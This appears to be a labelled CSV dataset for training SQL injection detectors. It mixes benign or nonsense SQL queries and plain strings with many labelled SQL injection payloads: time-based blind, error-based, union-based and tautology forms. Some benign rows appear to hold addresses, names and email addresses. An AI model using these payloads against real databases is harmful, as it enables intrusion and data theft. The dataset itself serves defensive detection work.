Query,Label
"1' or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
"select * from generate_series  (  2382,2382,case when   (  2382  =  4352  )   then 1 else 0 end  )   limit 1--",1
SELECT AVG ( system ) FROM fix SELECT SUM ( dull ) ,0
"1""   )    )    and sleep  (  5  )   and    (    (   ""lied"" like ""lied",1
SELECT * FROM prove,0
-9840'   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'dzlp'  =  'dzlp,1
SELECT TOP 3 * FROM city WHERE shoot = 'ground' SELECT * FROM flow,0
SELECT * FROM fix  WHERE am NOT LIKE '[vegetable]%',0
plza. felix rodriguez de la fuente 140 3a,0
"-8109%""   )    )    union all select 9089,9089--",1
bertra canamasa,0
SELECT TRIM ( '    SQL Tutorial    ' )  AS TrimmedString;,0
"1'   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'cfhi' like 'cfhi",1
SELECT COUNT ( tears ) FROM might,0
select case when 7634  =  3954 then 1 else null end--,1
rodis-ryan@colorprint.info,0
SELECT * FROM riding FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM able,0
"   SELECT A.CustomerName AS CustomerName1, B.CustomerName AS CustomerName2,    A.CityFROM Customers A, Customers BWHERE A.CustomerID <> B.CustomerID  AND A.City  =  B.City ",0
7.02E+15,0
vento8eda4,0
filpica,0
"c/ echegaray s/n,",0
"1%""   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   ""%""  =  """,1
SELECT DISTINCT attached FROM camp,0
"-6377'||  (  select 'ryin' where 2113  =  2113 union all select 2113,2113,2113#",1
3549,0
"  SELECT safetyID AS ID, row AS me FROM action",0
"1'  )   where 7887  =  7887 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1
SELECT MIN ( square )  AS freedom FROM memory,0
SELECT * FROM six WHERE NOT community = 'famous'  AND NOT luck = 'engine',0
"espartero, 103, 5-f",0
select sleep  (  5  )   and    (    (   3404  =  3404,1
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   'hxcq'  =  'hxcq",1
"-1550%""   )    )     )   order by 1--",1
7395,0
1 and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   'wusq'  =  'wusq",1
"1'   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  ""pxbk"" like ""pxbk",1
 or ''^',1
"1%""   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   ""%""  =  """,1
"-4929"" where 6381  =  6381 or 8571  =  8571--",1
17493,0
"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--",1
"-7381'   )    )    or elt  (  5882  =  5919,5919  )   and    (    (   'nzri'  =  'nzri",1
SELECT * FROM wave,0
98097212g,0
"   SELECT eager,balloon,paint,older,law     (  (  compound JOIN dress ON tape.tired =  natural.saddle )   INNER JOIN ableON Orders.ago =  lot.preventID ) ",0
"1' in boolean mode  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   #",1
kwokchoi,0
SELECT * FROM other WHERE spread NOT BETWEEN 'supply' AND 'barn',0
1'||  (  select 'uiyj' from dual where 8320  =  8320,1
SELECT COUNT ( divide ) FROM kill,0
1'||  (  select 'adni' from dual where 6611  =  6611,1
"  SELECT * FROM machine WHERE fun NOT IN  ( 'moment', 'condition', 'earlier' )  ",0
SELECT column_name FROM table1 LEFT JOIN table2 ON table1.column_name  =  table2.column_name ;,0
SELECT cloth FROM kept,0
@,1
" end and    (    (     (  ""revx""  =  ""revx",1
SELECT TOP 50 PERCENT * FROM remarkable SELECT * FROM ten FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM those,0
SELECT * FROM easily WHERE led = 'field',0
"INSERT INTO driven ( your, country, welcome, popular, salt, wherever )  VALUES  ( 'fox', 'community'. bet', 'heavy', 'dog', 'replace', 'sister' )  ",0
DELETE FROM seems WHERE cream = 'production',0
SELECT * FROM breeze WHERE cost = 'mighty' LIMIT 3,0
SELECT * FROM father WHERE situation LIKE '%belong%',0
"1""  )   as mszg where 6184  =  6184 rlike sleep  (  5  )  --",1
"1""   )    )     )   waitfor delay '0:0:5' and    (    (     (  ""tuhy"" like ""tuhy",1
SELECT * FROM chosen WHERE importance = 'nest' LIMIT 3,0
cirio,0
"1""   )    )    as hkrh where 3060  =  3060 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
1' where 3701  =  3701 and 2006  =  2006,1
"select sleep  (  5  )   and   (  ""innk""  =  ""innk",1
"-2448%""  )   or 3038  =  3038",1
SELECT * FROM doing ORDER BY week DESC,0
SELECT * FROM creature WHERE game = 'hurried'  OR camp = 'rapidly',0
FROM  ( SELECT DISTINCT include FROM high ) ,0
SELECT MIN ( plan )  AS doctor FROM touch,0
SELECT * FROM tower WHERE built BETWEEN 'audience' AND 'pond',0
SELECT drawn ( s ) FROM closer INNER JOIN,0
"calle daniel florido rodriguez, 105, 2?f",0
"1'   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  'vjhw' like 'vjhw",1
"-7860'   )    )     )   union all select 7420,7420,7420,7420,7420,7420,7420,7420,7420,7420--",1
"1'  )   where 5883  =  5883 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"   SELECT Employees.thirty, COUNT ( Orders.mightyID )  AS peopleFROM    ( OrdersINNER JOIN plus ON Orders.receiveID  =  Employees.mainID ) ",0
SELECT * FROM  ( SELECT someone FROM nor ) ,0
kuzz,0
"calle florian de ocampo 114, 7?h",0
1   )    )    as foul where 4361  =  4361 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1
SELECT AVG ( Price ) FROM exist,0
"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",1
malleson_varney@tomorrow.com.cz,0
SELECT AVG ( consonant ) FROM music SELECT SUM ( dinner ) ,0
SELECT within ( s )  FROM map UNION ALL,0
f8av2,0
1 where 8214  =  8214 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
"-1079""  )   where 2865  =  2865 union all select 2865,2865,2865,2865,2865,2865,2865,2865,2865#",1
SELECT nearest ( s FROM apartment RIGHT JOIN,0
SELECT FROM_DAYS ( 685467 ) ;,0
 UPDATE brick SET may = 'taste'WHERE score = 'key',0
"1%""   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""%""  =  """,1
"  SELECT shutID AS ID, canal AS pile FROM bit",0
7.67474E+13,0
"1'  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  'yqmv'  =  'yqmv",1
"   SELECT Employees.halfway, COUNT ( Orders.laborID )  AS passFROM    ( OrdersINNER JOIN enjoy ON Orders.forgetID  =  Employees.dependID ) ",0
"1""  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""wmmg"" like ""wmmg",1
SELECT * FROM Customers  WHERE City LIKE '[!bsp]%';,0
"1%""   )    )     )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
nort$ea,0
mud6787t6,0
"1"" where 4183  =  4183 union all select null,null,null,null,null,null--",1
SELECT hot ( s )  FROM division LEFT JOIN,0
vilanova de arousa,0
"-8893%'  )   union all select 1254,1254--",1
"1%' union all select null,null,null,null,null--",1
 (  1589  =  1589  )  *1,1
bularros,0
SELECT rich ( s )  FROM sail UNION ALL,0
SELECT AVG ( alphabet )  FROM image  SELECT SUM ( company ) ,0
"1   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  # jpau",1
"-5275%'   )    )    union all select 9382,9382,9382,9382,9382,9382,9382,9382,9382,9382--",1
SELECT TOP 3 * FROM particular WHERE except = 'ranch' SELECT * FROM double,0
"-2007%'   )    )    union all select 7298,7298,7298#",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 30696 )  ORDER BY meta_id ASC",0
SELECT but ( s ) FROM cake INNER JOIN,0
errol@diseodesoftware.ml,0
1%'   )    )    and sleep  (  5  )  #,1
3.53283E+14,0
"calle bruno ayllon, 142, 3?c",0
SELECT AVG ( oldest ) FROM disappear SELECT SUM ( plates ) ,0
delvalle llers,0
SELECT AVG ( eventually ) FROM sit SELECT SUM ( quick ) ,0
"1'||  (  select 'dujx' where 6896  =  6896 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
SELECT option_value FROM wp_options WHERE option_name  =  '_options_youtube_url' LIMIT 1,0
SELECT * FROM chest WHERE room = 'completely' FETCH FIRST 3 ROWS ONLY,0
-8234'   )    )     )   or 9323  =  9323#,1
SELECT * FROM hair FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM drew,0
SELECT process FROM garden,0
SELECT * FROM hay WHERE gold = 'writing',0
regazo,0
"  SELECT * FROM research WHERE till NOT IN  ( 'production', 'winter', 'burst' )  ",0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 6623 )  ORDER BY meta_id ASC",0
SELECT * FROM  ( SELECT mind FROM supply ) ,0
" select * from users where id  =  1 or ""  )    (  ""  =  1 or 1  =  1 -- 1",1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  'qvoy'  =  'qvoy",1
"1""  )   where 2367  =  2367",1
SELECT column_name FROM table_name WHERE column_name operator ALL,0
SELECT officer FROM garden UNION SELECT full FROM obtain ORDER BY captain,0
SELECT COUNT ( rhyme ) FROM danger,0
"1%'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  '%'  =  '",1
"-9505'   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'qhdg'  =  'qhdg",1
SELECT * FROM even FETCH FIRST 50 PERCENT ROWS ONLY,0
l5r78gea,0
"  SELECT ADDTIME ( ""2017-06-15   09:34:21.000001"", ""5.000003"" ) ;",0
valdeprados,0
"1"" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
"c/ gravina, s/n",0
SELECT * FROM symbol WHERE audience  BETWEEN 10 AND 20,0
SELECT AVG ( step ) FROM say SELECT SUM ( wife ) ,0
SELECT * FROM sets ORDER BY enjoy,0
1%'   )    )     )   and 2444  =  9282#,1
pagni7@freecreditcheck.bg,0
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   'wmoo' like 'wmoo",1
SELECT DISTINCT darkness FROM lovely,0
SELECT * FROM bet WHERE NOT push = 'snow'  AND NOT near = 'could',0
1  )   as ktfu where 2637  =  2637,1
34859412z,0
"c/ 57 15, 9g",0
SELECT DISTINCT composed FROM figure,0
"calle ter, 20,",0
select   (  case when   (  4996  =  1734  )   then 1 else 4996*  (  select 4996 from master..sysdatabases  )   end  )  --,1
1'  )   and 7533  =  7533 and   (  'cryr'  =  'cryr,1
SELECT * FROM highway WHERE lucky = 'felt'  OR necessary = 'classroom',0
"1'  )   where 6772  =  6772 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",1
 UPDATE cave SET deal = 'needs'WHERE finger = 'sunlight',0
"1'   )    )    and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   'nvsy' like 'nvsy",1
"1%"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and ""%""  =  """,1
tajamar,0
SELECT apart FROM open UNION SELECT ruler FROM forget ORDER BY season,0
amescua,0
"   SELECT sides, sort, rose FROM came WHERE eye  IS NULL",0
SELECT * FROM young WHERE highest = 'folks' FETCH FIRST 3 ROWS ONLY,0
"1""   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""nevr"" like ""nevr",1
1' in boolean mode  )   and 5725  =  5552#,1
1.07544E+15,0
SELECT * FROM sheep,0
"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""icow"" like ""icow",1
"1""  )   where 8462  =  8462 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1
SELECT month ( s )  FROM selection,0
SELECT * FROM noise WHERE gray BETWEEN '1996-07-01' AND '1996-07-31',0
"-5652%'  )   union all select 4447,4447,4447,4447,4447,4447,4447,4447,4447--",1
SELECT * FROM cup 3 SELECT * FROM jungle,0
SELECT * FROM men FETCH FIRST 50 PERCENT ROWS ONLY,0
"select * from generate_series  (  5846,5846,case when   (  5846  =  5227  )   then 1 else 0 end  )   limit 1--",1
"1 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  -- viti",1
b82r8l23o,0
"  UPDATE occur SET swung =  'crack', City =  'tonight' WHERE disease =  building",0
SELECT * FROM helpful 3 SELECT * FROM store,0
DELETE FROM basic,0
1'  )   rlike sleep  (  5  )   and   (  'boto'  =  'boto,1
"  UPDATE nice SET surprise =  'rope', City =  'beginning' WHERE later =  image",0
47965007w,0
"1""   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""dbxi"" like ""dbxi",1
"  SELECT Orders.experimentrID, Employees.why, Employees.biggest FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.describeID ORDER BY Orders.instrumentID",0
SELECT * FROM anybody WHERE struck NOT BETWEEN 'pull' AND 'rabbit',0
1'+  (  select 'yyyn' where 5395  =  5395,1
" SELECT column_name ( s )  FROM west,center",0
1'+  (  select 'wyxu' where 2555  =  2555 union all select null#,1
"   SELECT nest, think+ ', ' + game+ ' ' + present+ ', ' + gain AS minerals  FROM physical",0
"1'  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'obmu'  =  'obmu",1
ansaldo,0
p870en538r7,0
"  SELECT Orders.obtainrID, Employees.curious, Employees.nodded FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.dieID ORDER BY Orders.sickID",0
SELECT feet ( s FROM forty RIGHT JOIN,0
" SELECT * FROM per ORDER BY straight ASC, trail DESC",0
knight_freihart@tresbrujas.qa,0
"1  )   where 9469  =  9469 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
SELECT AVG ( fort ) FROM his SELECT SUM ( honor ) ,0
SELECT DISTINCT recent FROM mysterious,0
39202408n,0
parilli cresta,0
SELECT * FROM return WHERE NOT song = 'construction'  AND NOT willing = 'cap',0
SELECT cover ( s )  FROM pay FULL OUTER JOIN,0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual  )  ||'",1
"   SELECT COUNT ( unhappy ) , tomorrow FROM load BY develop",0
suwanawo5,0
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367582 ) ,0
SELECT touch FROM dig UNION ALL SELECT skill FROM folks ORDER BY porch,0
SELECT * FROM operation WHERE greatest = 'strip' LIMIT 3,0
 or 1  =  1 --,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 262335 )  ORDER BY meta_id ASC",0
SELECT * FROM through WHERE vegetable LIKE '%universe%',0
SELECT * FROM goose FETCH FIRST 50 PERCENT ROWS ONLY,0
"1%'  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1""   )    )    union all select null,null,null--",1
SELECT * FROM flight WHERE becoming BETWEEN 'copper' AND 'yard',0
SELECT * FROM  ( SELECT numeral FROM easy ) ,0
SELECT * FROM bank WHERE    NOT word = 'evidence',0
SELECT return ( s )  FROM wait SELECT sound ( s ) ,0
kiri,0
"1'+  (  select 'usoq' where 7783  =  7783 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   +'",1
SELECT option_value FROM wp_options WHERE option_name  =  'sm_gae' LIMIT 1,0
SELECT * FROM copy WHERE rough NOT LIKE 'two%',0
"plaa gabriela mistral, 140",0
SELECT TOP 50 PERCENT * FROM same SELECT * FROM love FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM wood,0
